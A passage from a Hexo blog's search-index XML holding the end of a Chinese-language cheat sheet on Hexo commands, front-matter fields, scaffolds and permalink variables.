class="line">hexo deploy #将.deploy目录部署到GitHub</span><br><span class="line"></span><br><span class="line">hexo new [layout] &lt;title&gt;</span><br><span class="line">hexo new photo &quot;My Gallery&quot;</span><br><span class="line">hexo new &quot;Hello World&quot; --lang tw</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">变量</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">layout</td><td align="left">布局</td></tr><tr><td align="left">title</td><td align="left">标题</td></tr><tr><td align="left">date</td><td align="left">文件建立日期</td></tr><tr><td align="left"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">title: 使用Hexo搭建个人博客</span><br><span class="line">layout: post</span><br><span class="line">date: 2014-03-03 19:07:43</span><br><span class="line">comments: true</span><br><span class="line">categories: Blog</span><br><span class="line">tags: [Hexo]</span><br><span class="line">keywords: Hexo, Blog</span><br><span class="line">description: 生命在于折腾，又把博客折腾到Hexo了。给Hexo点赞。</span><br></pre></td></tr></table></figure></td><td align="left"></td></tr></tbody></table><h3 id="模版（Scaffold）"><a href="#模版（Scaffold）" class="headerlink" title="模版（Scaffold）"></a>模版（Scaffold）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new photo &quot;My Gallery&quot;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">变量</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">layout</td><td align="left">布局</td></tr><tr><td align="left">title</td><td align="left">标题</td></tr><tr><td align="left">date</td><td align="left">文件建立日期</td></tr><tr><td align="left">### 设置文章摘要</td><td align="left"></td></tr><tr><td align="left"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">以上是文章摘要 &lt;!--more--&gt; 以下是余下全文</span><br></pre></td></tr></table></figure></td><td align="left"></td></tr></tbody></table><h3 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo new page &lt;title&gt;</span><br><span class="line">hexo new post &lt;title&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">变量</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">:title</td><td align="left">标题</td></tr><tr><td align="left">:year</td><td align="left">建立的年份（4 位数）</td></tr><tr><td align="left">:month</td><td align="left">建立的月份（2 位数）</td></tr><tr><td align="left">:i_month</td><td align="left">建立的月份（去掉开头的零）</td></tr><tr><td align="left">:day</td><td align="left">建立的日期（2 位数）</td></tr><tr><td align="left">:i_day</td><td align="left">建立的日期（去掉开头的零）</td></tr><tr><td align="left">### 推送到服务器上</td><td align="left"></td></tr><tr><td align="left"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo n #写文章</span><br><span class="line">hexo g #生成</span><br><span class="line">hexo d #部署 #可与hexo g合并为 hexo d -g</span><br></pre></td></tr></table></figure></td><td align="left"></td></tr></tbody></table>]]></content>
      
      <categories>
          
          <category> Document </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
